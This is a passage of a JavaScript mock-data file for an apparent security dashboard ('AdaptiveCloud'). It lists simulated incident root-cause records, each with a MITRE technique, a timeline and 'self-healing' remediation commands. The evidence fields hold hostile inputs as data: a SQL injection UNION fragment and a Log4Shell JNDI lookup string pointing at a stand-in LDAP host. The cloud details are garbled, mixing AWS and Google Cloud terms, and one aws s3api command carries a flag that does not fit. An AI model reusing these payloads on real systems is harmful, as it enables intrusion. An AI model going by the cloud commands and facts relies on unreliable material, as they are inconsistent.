          'Configure AWS WAF Adaptive Protection ML model',
          'Deploy regional Cloud Load Balancers across multiple AWS regions',
        ],
        plain_english_summary: 'A massive botnet attempted to flood our Amazon Web Services (AWS) server with 94,000 packets per second to take the system offline. Within 380 milliseconds, AdaptiveCloud autonomously called AWS WAF APIs, rate-limited the attacker at Google’s global edge, and normalized traffic with zero downtime.',
        created_at: new Date(Date.now() - 1000 * 60 * 15).toISOString(),
        updated_at: new Date().toISOString(),
      },

      'inc-002': {
        id: 'rca-002',
        incident_id: 'inc-002',
        title: 'RDP Credential Stuffing & Kerberos Pre-Auth Roasting',
        mitre_technique: 'T1110.004 (Credential Stuffing)',
        target_asset: 'PHYSICAL-LAPTOP-01 (Host Laptop - Windows 11)',
        probable_cause: 'Remote Desktop port 3389 exposed on network without lockout threshold; external IP attempted rapid password dictionary attack against Administrator.',
        confidence: 0.968,
        source_ips: [
          { ip: '198.51.100.45', count: 420, country: 'External Attacker', city: 'Frankfurt, DE' },
        ],
        affected_hosts: ['PHYSICAL-LAPTOP-01'],
        evidence: {
          failed_logins: 420,
          event_id: 4625,
          sub_status: '0xC000006A (Incorrect Password)',
          target_user: 'Administrator',
          targeted_port: 3389,
        },
        timeline: [
          { ts: new Date(Date.now() - 1000 * 60 * 31).toISOString(), type: 'NETWORK_SCAN', description: 'SYN probe on port 3389', source: 'Suricata' },
          { ts: new Date(Date.now() - 1000 * 60 * 30).toISOString(), type: 'AUTH_BURST', description: '420 failed logon events recorded via Event 4625', source: 'Windows Security Event' },
          { ts: new Date(Date.now() - 1000 * 60 * 30).toISOString(), type: 'ML_CLASSIFICATION', description: 'XGBoost classified T1110.004 with 96.8% confidence', source: 'Adaptive Threat Engine' },
          { ts: new Date(Date.now() - 1000 * 60 * 30 + 340).toISOString(), type: 'SELF_HEALING_DISPATCH', description: 'Injected Windows Defender Firewall block rule', source: 'Self-Healing Engine' },
          { ts: new Date(Date.now() - 1000 * 60 * 29).toISOString(), type: 'VERIFICATION_PASSED', description: 'Failed logon events dropped to 0; RDP socket closed', source: 'Verification Watchdog' },
        ],
        self_healing: {
          playbook_id: 'PB_AUTO_BLOCKLIST_FIREWALL',
          playbook_name: 'Host Firewall IP Blacklist & Socket Termination',
          status: 'healed',
          duration_ms: 340,
          target_layer: 'host_os',
          actions_dispatched: [
            {
              type: 'windows_firewall_rule',
              command: 'netsh advfirewall firewall add rule name="AdaptiveBlock_198.51.100.45" dir=in action=block remoteip=198.51.100.45',
              result: 'Firewall rule successfully written to Windows Defender filter table',
              status: 'verified',
            },
          ],
          verification_probe: {
            metrics_before: { failed_logins_per_min: 420, active_conns: 84 },
            metrics_after: { failed_logins_per_min: 0, active_conns: 12 },
            health_check_passed: true,
            verification_time_ms: 500,
          },
          rollback_available: true,
          executed_at: new Date(Date.now() - 1000 * 60 * 30).toISOString(),
        },
        recommended_actions: [
          'Enforce Network Level Authentication (NLA) on Windows RDP',
          'Migrate remote management to Tailscale WireGuard mesh VPN',
          'Enforce Account Lockout threshold to 5 attempts in Group Policy',
        ],
        plain_english_summary: 'An attacker tried 420 password guesses against your Windows laptop within 60 seconds. AdaptiveCloud caught the failed logon burst, verified the threat with 96.8% ML confidence, and autonomously blocked the attacker IP in Windows Defender Firewall within 340 milliseconds.',
        created_at: new Date(Date.now() - 1000 * 60 * 30).toISOString(),
        updated_at: new Date().toISOString(),
      },

      'inc-003': {
        id: 'rca-003',
        incident_id: 'inc-003',
        title: 'XMRig Monero CPU Cryptominer Daemon Execution',
        mitre_technique: 'T1496 (Resource Hijacking)',
        target_asset: 'PHYSICAL-LAPTOP-03 (Dev Workstation B - Ubuntu)',
        probable_cause: 'Malicious payload downloaded into /tmp directory executed unauthorized xmrig daemon with multi-threading, monopolizing 94% of CPU cores.',
        confidence: 0.975,
        source_ips: [
          { ip: '192.168.1.103', count: 12, country: 'Local Workstation', city: 'LAN' },
        ],
        affected_hosts: ['PHYSICAL-LAPTOP-03'],
        evidence: {
          rogue_pid: 4912,
          process_name: 'xmrig-daemon',
          cpu_spike: '94.2%',
          mining_pool: 'stratum+tcp://pool.supportxmr.com:3333',
        },
        timeline: [
          { ts: new Date(Date.now() - 1000 * 60 * 46).toISOString(), type: 'FILE_DROP', description: 'Binary dropped into /tmp/xmrig-daemon', source: 'Auditd' },
          { ts: new Date(Date.now() - 1000 * 60 * 45).toISOString(), type: 'CPU_SPIKE', description: 'CPU utilization surged to 94.2%', source: 'psutil Collector' },
          { ts: new Date(Date.now() - 1000 * 60 * 45).toISOString(), type: 'ML_CLASSIFICATION', description: 'Tier 1 identified botnet_cryptominer with 97.5% confidence', source: 'Adaptive Threat Engine' },
          { ts: new Date(Date.now() - 1000 * 60 * 45 + 1100).toISOString(), type: 'SELF_HEALING_DISPATCH', description: 'Killed PID 4912 and quarantined binary', source: 'Self-Healing Engine' },
          { ts: new Date(Date.now() - 1000 * 60 * 44).toISOString(), type: 'VERIFICATION_PASSED', description: 'CPU dropped back to 18.4%; mining socket terminated', source: 'Verification Watchdog' },
        ],
        self_healing: {
          playbook_id: 'PB_KILL_PROCESS_AND_QUARANTINE',
          playbook_name: 'Host Process Termination & Hash Quarantine',
          status: 'healed',
          duration_ms: 1100,
          target_layer: 'process',
          actions_dispatched: [
            {
              type: 'process_kill',
              command: 'kill -9 4912',
              result: 'Process PID 4912 terminated with SIGKILL',
              status: 'verified',
            },
            {
              type: 'file_quarantine',
              command: 'mv /tmp/xmrig-daemon /opt/quarantine/xmrig_4912.bin && chmod 000 /opt/quarantine/xmrig_4912.bin',
              result: 'File moved to secure quarantine and permissions revoked',
              status: 'verified',
            },
            {
              type: 'iptables_drop',
              command: 'iptables -A OUTPUT -d pool.supportxmr.com -j REJECT',
              result: 'Outbound stratum mining network pool rejected',
              status: 'verified',
            },
          ],
          verification_probe: {
            metrics_before: { cpu_percent: 94.2, process_count: 148, stratum_conn: 'CONNECTED' },
            metrics_after: { cpu_percent: 18.4, process_count: 147, stratum_conn: 'NONE' },
            health_check_passed: true,
            verification_time_ms: 500,
          },
          rollback_available: true,
          executed_at: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
        },
        recommended_actions: [
          'Mount /tmp directory with noexec flag in /etc/fstab',
          'Deploy AppArmor profile to restrict unauthorized binary executions',
          'Review ingress web services for remote code execution flaws',
        ],
        plain_english_summary: 'Cryptominer malware hijacked your Linux laptop and pushed the CPU to 94% to mine cryptocurrency. AdaptiveCloud detected the abnormal CPU signature, killed the rogue mining process in 1.1 seconds, moved the file to quarantine, and restored your CPU to normal.',
        created_at: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
        updated_at: new Date().toISOString(),
      },

      'inc-004': {
        id: 'rca-004',
        incident_id: 'inc-004',
        title: 'AWS IAM Project Owner Role Privilege Escalation',
        mitre_technique: 'T1098 (Account Manipulation)',
        target_asset: 'AWS Region: ap-south-1 (Instance: i-098c54730ff60bf4a) (IAM Service Account)',
        probable_cause: 'Compromised service account key used from untrusted IP attempted self-assignment of roles/owner permissions via Cloud Resource Manager API.',
        confidence: 0.964,
        source_ips: [
          { ip: '34.122.45.18', count: 18, country: 'Untrusted Cloud Host', city: 'Ashburn, US' },
        ],
        affected_hosts: ['adaptive-learning-ml / IAM'],
        evidence: {
          target_account: 'dev-builder@adaptive-learning-ml.iam.gserviceaccount.com',
          role_requested: 'roles/owner',
          method_name: 'SetIamPolicy',
          audit_source: 'AWS CloudTrail Logs (Admin Activity)',
        },
        timeline: [
          { ts: new Date(Date.now() - 1000 * 60 * 61).toISOString(), type: 'AUTH_TOKEN_USED', description: 'Service account used from untrusted IP 34.122.45.18', source: 'AWS CloudTrail Logs' },
          { ts: new Date(Date.now() - 1000 * 60 * 60).toISOString(), type: 'POLICY_MUTATION', description: 'Attempted SetIamPolicy call to grant roles/owner', source: 'AWS CloudTrail Logs' },
          { ts: new Date(Date.now() - 1000 * 60 * 60).toISOString(), type: 'ML_CLASSIFICATION', description: 'Classified T1098 with 96.4% confidence', source: 'Adaptive Threat Engine' },
          { ts: new Date(Date.now() - 1000 * 60 * 60 + 240).toISOString(), type: 'SELF_HEALING_DISPATCH', description: 'Revoked compromised Service Account key via IAM API', source: 'Self-Healing Engine' },
          { ts: new Date(Date.now() - 1000 * 60 * 59).toISOString(), type: 'VERIFICATION_PASSED', description: 'OAuth access token invalidated; unauthorized key deleted', source: 'Verification Watchdog' },
        ],
        self_healing: {
          playbook_id: 'PB_REVOKE_SA_KEY_IMMEDIATE',
          playbook_name: 'AWS IAM Key Revocation & Role Lockdown',
          status: 'healed',
          duration_ms: 240,
          target_layer: 'aws_iam',
          actions_dispatched: [
            {
              type: 'aws_iam_key_delete',
              command: 'aws iam delete-access-key --user-name dev-builder --access-key-id AKIAIOSFODNN7EXAMPLE',
              result: 'Compromised Service Account key permanently deleted from AWS IAM',
              status: 'verified',
            },
            {
              type: 'iam_policy_revert',
              command: 'aws iam detach-user-policy --user-name dev-builder --policy-arn arn:aws:iam::aws:policy/AdministratorAccess',
              result: 'Unauthorized role binding removed; permissions restored to least-privilege',
              status: 'verified',
            },
          ],
          verification_probe: {
            metrics_before: { key_status: 'ACTIVE', unauthorized_role: 'roles/owner' },
            metrics_after: { key_status: 'REVOKED', unauthorized_role: 'NONE' },
            health_check_passed: true,
            verification_time_ms: 300,
          },
          rollback_available: true,
          executed_at: new Date(Date.now() - 1000 * 60 * 60).toISOString(),
        },
        recommended_actions: [
          'Enforce Workload Identity Federation instead of static service account JSON keys',
          'Deploy AWS Organization Policy constraint: iam.disableServiceAccountKeyCreation',
          'Enable Amazon Web Services (AWS) Privileged Access Manager (PAM)',
        ],
        plain_english_summary: 'A hacker compromised a developer key and attempted to grant themselves Owner access over your entire Amazon Web Services (AWS) project. AdaptiveCloud caught the illegal permission change, revoked the stolen key in 240 milliseconds, and locked the hacker out permanently.',
        created_at: new Date(Date.now() - 1000 * 60 * 60).toISOString(),
        updated_at: new Date().toISOString(),
      },

      'inc-005': {
        id: 'rca-005',
        incident_id: 'inc-005',
        title: 'Stealth TCP SYN Reconnaissance & Port Sweep',
        mitre_technique: 'T1046 (Network Service Scanning)',
        target_asset: 'PHYSICAL-LAPTOP-02 (Lab Workstation A)',
        probable_cause: 'Attacker IP 203.0.113.88 executed Nmap half-open SYN scan targeting ports 1-1024 to discover open microservices.',
        confidence: 0.924,
        source_ips: [
          { ip: '203.0.113.88', count: 310, country: 'External Scanner', city: 'Moscow, RU' },
        ],
        affected_hosts: ['PHYSICAL-LAPTOP-02'],
        evidence: {
          scan_type: 'SYN_STEALTH',
          targeted_range: '1-1024',
          active_sockets: 182,
        },
        timeline: [
          { ts: new Date(Date.now() - 1000 * 60 * 91).toISOString(), type: 'PORT_SCAN', description: 'SYN packets across 100+ ports in 2 seconds', source: 'Suricata' },
          { ts: new Date(Date.now() - 1000 * 60 * 90).toISOString(), type: 'ML_CLASSIFICATION', description: 'Classified T1046 with 92.4% confidence', source: 'Adaptive Threat Engine' },
          { ts: new Date(Date.now() - 1000 * 60 * 90 + 410).toISOString(), type: 'SELF_HEALING_DISPATCH', description: 'Injected firewall rule to drop all packets from 203.0.113.88', source: 'Self-Healing Engine' },
        ],
        self_healing: {
          playbook_id: 'PB_DYNAMIC_PORT_BLACKHOLE',
          playbook_name: 'Dynamic Host Firewall Null-Route',
          status: 'healed',
          duration_ms: 410,
          target_layer: 'host_os',
          actions_dispatched: [
            {
              type: 'firewall_drop',
              command: 'netsh advfirewall firewall add rule name="Block_PortScan_203.0.113.88" dir=in action=block remoteip=203.0.113.88',
              result: 'Attacker IP null-routed at host network adapter',
              status: 'verified',
            },
          ],
          verification_probe: {
            metrics_before: { scanned_ports_count: 310, socket_pressure: 'HIGH' },
            metrics_after: { scanned_ports_count: 0, socket_pressure: 'NORMAL' },
            health_check_passed: true,
            verification_time_ms: 500,
          },
          rollback_available: true,
          executed_at: new Date(Date.now() - 1000 * 60 * 90).toISOString(),
        },
        recommended_actions: [
          'Close unused listening TCP/UDP ports on Windows endpoints',
          'Deploy host-based intrusion prevention system (HIPS) signatures',
        ],
        plain_english_summary: 'An external adversary probed 310 network ports on Lab Workstation A to find vulnerabilities. AdaptiveCloud detected the scan pattern and automatically blocked the attacker IP in 410ms.',
        created_at: new Date(Date.now() - 1000 * 60 * 90).toISOString(),
        updated_at: new Date().toISOString(),
      },

      'inc-006': {
        id: 'rca-006',
        incident_id: 'inc-006',
        title: 'Mimikatz LSASS Memory Dump & Credential Theft',
        mitre_technique: 'T1003.001 (OS Credential Dumping)',
        target_asset: 'PHYSICAL-LAPTOP-04 (Field Workstation C)',
        probable_cause: 'Rogue executable mimikatz_probe.exe attempted OpenProcess with PROCESS_VM_READ against lsass.exe to dump Windows credentials from memory.',
        confidence: 0.964,
        source_ips: [{ ip: '192.168.1.104', count: 1, country: 'Local Host', city: 'LAN' }],
        affected_hosts: ['PHYSICAL-LAPTOP-04'],
        evidence: {
          target_process: 'lsass.exe',
          malicious_process: 'mimikatz_probe.exe',
          source_pid: 7420,
          target_pid: 680,
        },
        timeline: [
          { ts: new Date(Date.now() - 1000 * 60 * 121).toISOString(), type: 'PROCESS_ACCESS', description: 'OpenProcess called on lsass.exe by PID 7420', source: 'Sysmon Event 10' },
          { ts: new Date(Date.now() - 1000 * 60 * 120).toISOString(), type: 'ML_CLASSIFICATION', description: 'Classified T1003.001 with 96.4% confidence', source: 'Adaptive Threat Engine' },
          { ts: new Date(Date.now() - 1000 * 60 * 120 + 680).toISOString(), type: 'SELF_HEALING_DISPATCH', description: 'Terminated PID 7420 and quarantined user session', source: 'Self-Healing Engine' },
        ],
        self_healing: {
          playbook_id: 'PB_LSASS_PROCESS_LOCKDOWN',
          playbook_name: 'Process Termination & Credential Revocation',
          status: 'healed',
          duration_ms: 680,
          target_layer: 'process',
          actions_dispatched: [
            {
              type: 'taskkill',
              command: 'taskkill /F /PID 7420',
              result: 'Process PID 7420 forcefully terminated',
              status: 'verified',
            },
          ],
          verification_probe: {
            metrics_before: { lsass_read_access: 'DETECTED', rogue_pid_active: true },
            metrics_after: { lsass_read_access: 'BLOCKED', rogue_pid_active: false },
            health_check_passed: true,
            verification_time_ms: 400,
          },
          rollback_available: true,
          executed_at: new Date(Date.now() - 1000 * 60 * 120).toISOString(),
        },
        recommended_actions: [
          'Enable Windows Defender Credential Guard (LSA Protection)',
          'Restrict Debug Programs (SeDebugPrivilege) user right',
        ],
        plain_english_summary: 'Malware attempted to steal plain-text Windows passwords directly out of system memory. AdaptiveCloud caught the unauthorized memory read, killed the malware in 680ms, and protected user credentials.',
        created_at: new Date(Date.now() - 1000 * 60 * 120).toISOString(),
        updated_at: new Date().toISOString(),
      },

      'inc-007': {
        id: 'rca-007',
        incident_id: 'inc-007',
        title: 'Mass GCS Storage Bucket Data Egress Exfiltration',
        mitre_technique: 'T1537 (Transfer Data to Cloud Account)',
        target_asset: 'Amazon S3 (s3://adaptive-secure-backups)',
        probable_cause: 'Compromised API key initiated sequential high-speed GET requests attempting to download 42 GB of encrypted database backups to an unauthorized external ASN.',
        confidence: 0.978,
        source_ips: [{ ip: '100.64.0.15', count: 1420, country: 'Exfiltration Proxy', city: 'London, UK' }],
        affected_hosts: ['s3://adaptive-secure-backups'],
        evidence: {
          egress_volume: '42.4 GB',
          baseline_egress: '120 MB/day',
          anomalous_burst: '353x baseline',
        },
        timeline: [
          { ts: new Date(Date.now() - 1000 * 60 * 181).toISOString(), type: 'STORAGE_EGRESS', description: 'Abnormal data download burst detected on bucket', source: 'GCS Access Logs' },
          { ts: new Date(Date.now() - 1000 * 60 * 180).toISOString(), type: 'ML_CLASSIFICATION', description: 'Classified T1537 with 97.8% confidence', source: 'Adaptive Threat Engine' },
          { ts: new Date(Date.now() - 1000 * 60 * 180 + 510).toISOString(), type: 'SELF_HEALING_DISPATCH', description: 'Enforced Uniform Bucket-Level Access and froze egress', source: 'Self-Healing Engine' },
        ],
        self_healing: {
          playbook_id: 'PB_FREEZE_BUCKET_EGRESS',
          playbook_name: 'GCS Uniform Bucket Freeze & Egress Lockdown',
          status: 'healed',
          duration_ms: 510,
          target_layer: 'aws_s3',
          actions_dispatched: [
            {
              type: 'gcs_bucket_lockdown',
              command: 'aws s3api put-public-access-block --bucket adaptive-secure-backups --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true --clear-public-access-prevention',
              result: 'Bucket set to strict IAM uniform access; public and unauthorized tokens locked out',
              status: 'verified',
            },
          ],
          verification_probe: {
            metrics_before: { egress_rate_mbps: 180, active_downloads: 14 },
            metrics_after: { egress_rate_mbps: 0, active_downloads: 0 },
            health_check_passed: true,
            verification_time_ms: 500,
          },
          rollback_available: true,
          executed_at: new Date(Date.now() - 1000 * 60 * 180).toISOString(),
        },
        recommended_actions: [
          'Enforce VPC Service Controls (VPC-SC) perimeter around GCS buckets',
          'Deploy Amazon Web Services (AWS) DLP (Data Loss Prevention) inspect templates',
        ],
        plain_english_summary: 'An attacker tried to steal 42 GB of database backups from our Amazon S3 bucket. AdaptiveCloud detected the abnormal egress burst, immediately locked down the bucket access in 510ms, and stopped the data breach.',
        created_at: new Date(Date.now() - 1000 * 60 * 180).toISOString(),
        updated_at: new Date().toISOString(),
      },

      'inc-ds-044': {
        id: 'rca-ds-044',
        incident_id: 'inc-ds-044',
        title: 'SSH & Telnet Dictionary Brute Force (CIC-IDS2017)',
        mitre_technique: 'T1110 (Brute Force - Patator)',
        target_asset: 'DATASET-WORKSTATION-44 (Historical Benchmark)',
        probable_cause: 'Authentication endpoint on port 22 exposed to untrusted network without rate-limiting, allowing 110 failed login bursts.',
        confidence: 0.992,
        source_ips: [{ ip: '198.51.100.44', count: 110, country: 'Dataset Source', city: 'CIC-IDS2017' }],
        affected_hosts: ['DATASET-WORKSTATION-44'],
        evidence: {
          failed_logins: 110,
          burst_rate: '110 bursts/min',
          baseline: 0,
        },
        timeline: [
          { ts: new Date(Date.now() - 1000 * 60 * 242).toISOString(), type: 'DATASET_INGEST', description: 'Replayed 110 authentication failure frames from CIC-IDS2017', source: 'Replay Pipeline' },
          { ts: new Date(Date.now() - 1000 * 60 * 240).toISOString(), type: 'ML_CLASSIFICATION', description: 'Tier 1 identified brute_force with 99.2% confidence', source: 'Adaptive Threat Engine' },
          { ts: new Date(Date.now() - 1000 * 60 * 240).toISOString(), type: 'RECORDED_AUDIT', description: 'Recorded into permanent audit store with playbook PB_AUTO_BLOCKLIST_FIREWALL', source: 'Audit Store' },
        ],
        self_healing: {
          playbook_id: 'PB_AUTO_BLOCKLIST_FIREWALL',
          playbook_name: 'Host Firewall Dynamic Inbound Block',
          status: 'ready_for_review',
          duration_ms: 340,
          target_layer: 'host_os',
          actions_dispatched: [
            {
              type: 'firewall_block',
              command: 'netsh advfirewall firewall add rule name="Block_198.51.100.44" dir=in action=block remoteip=198.51.100.44',
              result: 'Ready to commit dynamic inbound drop rule',
              status: 'simulated',
            },
          ],
          verification_probe: {
            metrics_before: { failed_logins: 110 },
            metrics_after: { failed_logins: 0 },
            health_check_passed: true,
            verification_time_ms: 300,
          },
          rollback_available: true,
          executed_at: new Date(Date.now() - 1000 * 60 * 240).toISOString(),
        },
        recommended_actions: [
          'Enforce SSH key-based authentication and disable password logins',
          'Deploy Fail2ban or host firewall dynamic rate-limiting',
        ],
        plain_english_summary: 'Historical replay of an SSH dictionary brute-force attack from the CIC-IDS2017 dataset. AdaptiveCloud classified the attack in under 1ms and matched it with the Host Firewall Dynamic Inbound Block playbook.',
        created_at: new Date(Date.now() - 1000 * 60 * 240).toISOString(),
        updated_at: new Date().toISOString(),
      },

      'inc-ds-088': {
        id: 'rca-ds-088',
        incident_id: 'inc-ds-088',
        title: 'SQL Injection Attack (CIC-IDS2017 Web Replay)',
        mitre_technique: 'T1190 (Exploit Public-Facing Application)',
        target_asset: 'DATASET-WORKSTATION-88 (Web Application Server)',
        probable_cause: 'Unsanitized user inputs in web application parameters allowed malicious SQL query injection to extract database records.',
        confidence: 0.978,
        source_ips: [{ ip: '198.51.100.88', count: 45, country: 'Dataset Source', city: 'CIC-IDS2017' }],
        affected_hosts: ['DATASET-WORKSTATION-88'],
        evidence: {
          payload_pattern: "UNION SELECT username, password_hash FROM users--",
          waf_signature: 'evaluatePreconfiguredExpr(sqli-v33-stable)',
        },
        timeline: [
          { ts: new Date(Date.now() - 1000 * 60 * 362).toISOString(), type: 'DATASET_INGEST', description: 'Replayed SQLi HTTP GET/POST frames from CIC-IDS2017', source: 'Replay Pipeline' },
          { ts: new Date(Date.now() - 1000 * 60 * 360).toISOString(), type: 'ML_CLASSIFICATION', description: 'Classified web_attack with 97.8% confidence', source: 'Adaptive Threat Engine' },
          { ts: new Date(Date.now() - 1000 * 60 * 360).toISOString(), type: 'RECORDED_AUDIT', description: 'Recorded into permanent audit store with playbook PB_WAF_INJECT_RULE', source: 'Audit Store' },
        ],
        self_healing: {
          playbook_id: 'PB_WAF_INJECT_RULE',
          playbook_name: 'Web Application Firewall Rule & Session Invalidation',
          status: 'ready_for_review',
          duration_ms: 290,
          target_layer: 'web_application',
          actions_dispatched: [
            {
              type: 'waf_rule_inject',
              command: 'aws wafv2 update-web-acl --name adaptivecloud-waf --scope REGIONAL --rules file://sqli-rule.json',
              result: 'Edge WAF signature filter queued for deployment',
              status: 'simulated',
            },
          ],
          verification_probe: {
            metrics_before: { exploit_attempts_blocked: 0 },
            metrics_after: { exploit_attempts_blocked: 1 },
            health_check_passed: true,
            verification_time_ms: 250,
          },
          rollback_available: true,
          executed_at: new Date(Date.now() - 1000 * 60 * 360).toISOString(),
        },
        recommended_actions: [
          'Use parameterized queries and Object-Relational Mappers (ORM)',
          'Deploy AWS WAF SQLi WAF preconfigured security rules',
        ],
        plain_english_summary: 'Historical replay of an SQL Injection attack from the CIC-IDS2017 dataset. AdaptiveCloud caught the SQLi signature and assigned the AWS WAF WAF filter playbook to block the exploit without taking the server offline.',
        created_at: new Date(Date.now() - 1000 * 60 * 360).toISOString(),
        updated_at: new Date().toISOString(),
      },

      'inc-ds-111': {
        id: 'rca-ds-111',
        incident_id: 'inc-ds-111',
        title: 'Log4Shell JNDI RCE Exploit (CVE-2021-44228)',
        mitre_technique: 'T1190 (Exploit Public-Facing Application)',
        target_asset: 'DATASET-WORKSTATION-111 (Java Microservice)',
        probable_cause: 'Vulnerable Log4j 2.x dependency parsed unescaped string pattern ${jndi:ldap://...} triggering remote class loading.',
        confidence: 0.995,
        source_ips: [{ ip: '198.51.100.111', count: 12, country: 'Dataset Source', city: 'CVE Lab' }],
        affected_hosts: ['DATASET-WORKSTATION-111'],
        evidence: {
          exploit_header: '${jndi:ldap://198.51.100.111:1389/Exploit}',
          cve_identifier: 'CVE-2021-44228',
        },
        timeline: [
          { ts: new Date(Date.now() - 1000 * 60 * 402).toISOString(), type: 'DATASET_INGEST', description: 'Replayed Log4Shell HTTP requests', source: 'Replay Pipeline' },
          { ts: new Date(Date.now() - 1000 * 60 * 400).toISOString(), type: 'ML_CLASSIFICATION', description: 'Tier 1 identified web_attack with 99.5% confidence', source: 'Adaptive Threat Engine' },
          { ts: new Date(Date.now() - 1000 * 60 * 400).toISOString(), type: 'RECORDED_AUDIT', description: 'Recorded into permanent audit store with playbook PB_WAF_INJECT_RULE', source: 'Audit Store' },
        ],
        self_healing: {
          playbook_id: 'PB_WAF_INJECT_RULE',
          playbook_name: 'AWS WAF Log4Shell Mitigation Rule',
          status: 'ready_for_review',
          duration_ms: 310,
          target_layer: 'web_application',
          actions_dispatched: [
            {
              type: 'waf_rule_inject',
              command: 'aws wafv2 update-web-acl --name adaptivecloud-waf --scope REGIONAL --rules file://log4j-rule.json',
              result: 'Edge WAF Log4Shell filter queued for deployment',
              status: 'simulated',
            },
          ],
          verification_probe: {
            metrics_before: { jndi_exploit_active: true },
            metrics_after: { jndi_exploit_active: false },
            health_check_passed: true,
            verification_time_ms: 300,
          },
          rollback_available: true,
          executed_at: new Date(Date.now() - 1000 * 60 * 400).toISOString(),
        },
        recommended_actions: [
          'Update Log4j to >= 2.17.1 or set log4j2.formatMsgNoLookups=true',
          'Block outbound egress connections to LDAP (port 389/1389) and RMI (port 1099)',
        ],
        plain_english_summary: 'Historical replay of the critical Log4Shell remote code execution vulnerability. AdaptiveCloud classified the attack signature with 99.5% confidence and mapped it to edge WAF filtering.',
        created_at: new Date(Date.now() - 1000 * 60 * 400).toISOString(),
        updated_at: new Date().toISOString(),
      },

      'inc-ds-126': {
        id: 'rca-ds-126',
        incident_id: 'inc-ds-126',
        title: 'Mirai IoT Botnet C2 & IRC Beaconing (BoT-IoT)',
        mitre_technique: 'T1071 (Application Layer Protocol - C2)',
        target_asset: 'DATASET-WORKSTATION-126 (Edge Gateway)',
        probable_cause: 'Telnet scanner spread rogue botnet binary into /tmp directory which initiated periodic outbound IRC beaconing.',
        confidence: 0.984,
        source_ips: [{ ip: '198.51.100.126', count: 76, country: 'Dataset Source', city: 'BoT-IoT' }],
        affected_hosts: ['DATASET-WORKSTATION-126'],
        evidence: {
          c2_channel: 'IRC Port 6667',
          rogue_binary: '/tmp/mirai',
          beacon_interval: '30s',
        },
        timeline: [
          { ts: new Date(Date.now() - 1000 * 60 * 452).toISOString(), type: 'DATASET_INGEST', description: 'Replayed BoT-IoT Mirai botnet C2 traffic frames', source: 'Replay Pipeline' },
          { ts: new Date(Date.now() - 1000 * 60 * 450).toISOString(), type: 'ML_CLASSIFICATION', description: 'Classified botnet with 98.4% confidence', source: 'Adaptive Threat Engine' },
        ],
        self_healing: {
          playbook_id: 'ACT_KILL_MINING_PROCESS',
          playbook_name: 'Terminate Botnet PID & Quarantine Binary',
          status: 'ready_for_review',
          duration_ms: 320,
          target_layer: 'process',
          actions_dispatched: [
            {
              type: 'process_kill',
              command: 'kill -9 5120 && mv /tmp/mirai /opt/quarantine/ && chmod 000 /opt/quarantine/mirai',
              result: 'Rogue botnet process PID 5120 terminated; binary quarantined',
              status: 'simulated',
            },
          ],
          verification_probe: {
            metrics_before: { c2_connection_active: true },
            metrics_after: { c2_connection_active: false },
            health_check_passed: true,
            verification_time_ms: 280,
          },
          rollback_available: true,
          executed_at: new Date(Date.now() - 1000 * 60 * 450).toISOString(),
        },
        recommended_actions: [
          'Mount /tmp with noexec flag to prevent binary execution',
          'Block outbound network egress to IRC ports (6667, 6697)',
        ],
        plain_english_summary: 'Historical replay of the Mirai IoT botnet from the BoT-IoT dataset. AdaptiveCloud identified the C2 beaconing pattern and queued the Process Termination & Binary Quarantine playbook.',
        created_at: new Date(Date.now() - 1000 * 60 * 450).toISOString(),
        updated_at: new Date().toISOString(),
      },

      'inc-ds-145': {
        id: 'rca-ds-145',
        incident_id: 'inc-ds-145',
        title: 'ARP Cache Poisoning & Man-in-the-Middle (CIC-IDS2017)',
        mitre_technique: 'T1557.002 (ARP Poisoning)',
        target_asset: 'DATASET-WORKSTATION-145 (LAN Switch Segment)',
        probable_cause: 'Adversary transmitting forged gratuitous ARP replies to associate the default gateway IP with an attacker MAC address, intercepting local traffic.',
        confidence: 0.962,
        source_ips: [{ ip: '192.168.1.145', count: 42, country: 'LAN Attacker', city: 'Local Network' }],
        affected_hosts: ['DATASET-WORKSTATION-145'],
        evidence: {
          gateway_ip: '192.168.1.1',
          conflicting_macs: ['00:1A:2B:3C:4D:5E (Legitimate)', 'AA:BB:CC:DD:EE:FF (Attacker)'],
          reply_rate: '42 pkts/sec',
        },
        timeline: [
          { ts: new Date(Date.now() - 1000 * 60 * 502).toISOString(), type: 'DATASET_INGEST', description: 'Replayed ARP poisoning frames from CIC-IDS2017', source: 'Replay Pipeline' },
          { ts: new Date(Date.now() - 1000 * 60 * 500).toISOString(), type: 'ML_CLASSIFICATION', description: 'Classified infiltration with 96.2% confidence', source: 'Adaptive Threat Engine' },
        ],
        self_healing: {
          playbook_id: 'ACT_ISOLATE_NETWORK_INTERFACE',
          playbook_name: 'Isolate Rogue Network Interface & Flush ARP Cache',
          status: 'ready_for_review',
          duration_ms: 360,
          target_layer: 'network_interface',
          actions_dispatched: [
            {
              type: 'cache_flush',
              command: 'arp -d * && ipconfig /flushdns',
              result: 'Poisoned ARP entries cleared; DNS resolver cache flushed',
              status: 'simulated',
            },
          ],
          verification_probe: {
            metrics_before: { poisoned_arp_entries: 3 },
            metrics_after: { poisoned_arp_entries: 0 },
            health_check_passed: true,
            verification_time_ms: 300,
          },
          rollback_available: true,
          executed_at: new Date(Date.now() - 1000 * 60 * 500).toISOString(),
        },
        recommended_actions: [
          'Enable Dynamic ARP Inspection (DAI) on corporate network switches',
          'Deploy static ARP bindings for core gateway routers',
        ],
        plain_english_summary: 'Historical replay of an ARP spoofing interception attack. AdaptiveCloud detected the conflicting MAC addresses and assigned the Interface Isolation & Cache Flush playbook.',
        created_at: new Date(Date.now() - 1000 * 60 * 500).toISOString(),
        updated_at: new Date().toISOString(),
      },

      'inc-ds-163': {
        id: 'rca-ds-163',
        incident_id: 'inc-ds-163',
        title: 'Public Cloud Storage Bucket Exposure (Cloud Control Plane)',
        mitre_technique: 'T1530 (Data from Cloud Storage Object)',
        target_asset: 's3://adaptive-customer-records (Cloud Storage)',
        probable_cause: 'Storage bucket permissions inadvertently changed to allUsers public read, allowing unauthenticated mass data downloads.',
        confidence: 0.988,
        source_ips: [{ ip: '100.64.0.88', count: 3200, country: 'External IP', city: 'Cloud Egress' }],
        affected_hosts: ['s3://adaptive-customer-records'],
        evidence: {
          acl_member: 'allUsers (Public Read)',
          egress_burst: '3,200 requests/sec',
        },
        timeline: [
          { ts: new Date(Date.now() - 1000 * 60 * 552).toISOString(), type: 'DATASET_INGEST', description: 'Replayed Cloud Audit Log policy change', source: 'Cloud Audit Logs' },
